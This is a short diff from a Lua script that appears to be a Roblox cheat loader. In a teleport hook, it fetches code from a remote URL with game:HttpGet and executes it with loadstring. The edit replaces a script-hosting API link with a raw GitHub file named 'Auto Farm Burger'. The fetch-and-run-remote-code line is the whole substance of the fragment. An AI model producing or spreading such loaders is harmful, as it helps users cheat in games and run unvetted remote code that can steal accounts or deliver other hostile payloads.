@@ -6,7 +6,7 @@ if teleport_func then
             repeat task.wait() until game:IsLoaded()
             task.wait(1.5)
             pcall(function()
-                loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/f839826919ec423285d515aef8082dce2a756a907d8e7931c3c05d987bdf20e1/download"))()
+               loadstring(game:HttpGet("https://raw.githubusercontent.com/user-null-0/test-repo-08888/refs/heads/main/Auto%20Farm%20Burger"))()
             end)
         ]])
     end)
